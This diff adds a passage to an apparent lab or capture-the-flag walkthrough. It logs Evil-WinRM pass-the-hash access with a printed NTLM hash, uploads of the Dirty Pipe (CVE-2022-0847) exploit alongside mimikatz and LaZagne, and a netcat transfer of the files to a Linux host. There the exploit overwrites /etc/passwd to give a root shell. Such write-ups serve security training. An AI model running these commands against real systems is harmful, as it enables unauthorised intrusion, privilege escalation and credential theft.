@@ -2886,3 +2886,117 @@ Linux MGMT01 5.10.0-051000-generic #202012132330 SMP Sun Dec 13 23:33:36 UTC 202
 ssmallsadm@MGMT01:~$ 
 
 ```
+
+
+```bash
+evil-winrm -i 172.16.8.3 -u Administrator -H fd1f7e5564060258ea787ddbb6e6afa2
+                                        
+Evil-WinRM shell v4.1
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                                
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                           
+                                        
+Info: Establishing connection to remote endpoint
+                                        
+Info: Connection successful
+*Evil-WinRM* PS C:\Users\Administrator\Documents> upload compile.sh
+                                        
+Info: Uploading /home/kali/tools/privesc/CVE-2022-0847-DirtyPipe-Exploits/compile.sh to C:\Users\Administrator\Documents\compile.sh                                                                                             
+                                        
+Data: 92 bytes of 92 bytes copied
+                                        
+Info: Upload successful!
+*Evil-WinRM* PS C:\Users\Administrator\Documents> upload exploit-1.c
+                                        
+Info: Uploading /home/kali/tools/privesc/CVE-2022-0847-DirtyPipe-Exploits/exploit-1.c to C:\Users\Administrator\Documents\exploit-1.c                                                                                           
+                                        
+Data: 7152 bytes of 7152 bytes copied
+                                        
+Info: Upload successful!
+*Evil-WinRM* PS C:\Users\Administrator\Documents> upload exploit-2.c
+                                        
+Info: Uploading /home/kali/tools/privesc/CVE-2022-0847-DirtyPipe-Exploits/exploit-2.c to C:\Users\Administrator\Documents\exploit-2.c                                                                                           
+                                        
+Data: 10336 bytes of 10336 bytes copied
+                                        
+Info: Upload successful!
+*Evil-WinRM* PS C:\Users\Administrator\Documents> ls
+
+
+    Directory: C:\Users\Administrator\Documents
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----       11/15/2026   9:48 AM        7374848 agent.exe
+-a----       11/15/2026  11:47 AM             71 compile.sh
+-a----       11/15/2026  11:47 AM           5364 exploit-1.c
+-a----       11/15/2026  11:47 AM           7752 exploit-2.c
+-a----       11/15/2026  10:00 AM              0 LaZagne.exe
+-a----       11/15/2026  10:00 AM        1250056 mimikatz.exe
+
+
+```
+
+```
+*Evil-WinRM* PS C:\Users\Administrator\Documents> upload nc64.exe
+                                        
+Info: Uploading /home/kali/tools/nc64.exe to C:\Users\Administrator\Documents\nc64.exe
+                                        
+Data: 60360 bytes of 60360 bytes copied
+
+```
+
+```
+*Evil-WinRM* PS C:\Users\Administrator\Documents> cmd /c "nc64.exe 172.16.9.25 8000 < compile.sh"
+```
+
+```
+*Evil-WinRM* PS C:\Users\Administrator\Documents> cmd /c "nc64.exe 172.16.9.25 8000 < exploit-1.c"
+*Evil-WinRM* PS C:\Users\Administrator\Documents> cmd /c "nc64.exe 172.16.9.25 8000 < exploit-2.c"
+```
+
+```
+ssmallsadm@MGMT01:~$ nc -lvnp 8000 > compile.sh
+Listening on 0.0.0.0 8000
+Connection received on 172.16.9.3 55400
+^C
+ssmallsadm@MGMT01:~$ ls                                                                                         
+compile.sh  flag.txt                                                                                            
+ssmallsadm@MGMT01:~$ nc -lvnp 8000 > exploit-1.c
+Listening on 0.0.0.0 8000                                                                                       
+Connection received on 172.16.9.3 55410                                                                         
+^C                                                                                                              
+ssmallsadm@MGMT01:~$ ls                                                                                         
+compile.sh  exploit-1.c  flag.txt                                                                               
+ssmallsadm@MGMT01:~$ file exploit-1.c
+exploit-1.c: C source, ASCII text                                                                               
+ssmallsadm@MGMT01:~$ file compile.sh
+compile.sh: Bourne-Again shell script, ASCII text executable                                                    
+ssmallsadm@MGMT01:~$ nc -lvnp 8000 > exploit-2.c
+Listening on 0.0.0.0 8000                                                                                       
+Connection received on 172.16.9.3 55427                                                                         
+^C                                                                                                              
+ssmallsadm@MGMT01:~$ ls                                                                                         
+compile.sh  exploit-1.c  exploit-2.c  flag.txt                                                                  
+ssmallsadm@MGMT01:~$ bash compile.sh                                                                            
+ssmallsadm@MGMT01:~$ ls                                                                                         
+compile.sh  exploit-1  exploit-1.c  exploit-2  exploit-2.c  flag.txt                                            
+ssmallsadm@MGMT01:~$ ./exploit-1                                                                                
+Backing up /etc/passwd to /tmp/passwd.bak ...                                                                   
+Setting root password to "piped"...                                                                             
+Password: Restoring /etc/passwd from /tmp/passwd.bak...                                                         
+Done! Popping shell... (run commands now)                                                                       
+id
+uid=0(root) gid=0(root) groups=0(root)
+cd /root     
+ls
+flag.txt  snap
+pwd  
+/root
+cat flag.txt
+206c03861986c0e264438cb6e8e90a19
+
+
+```
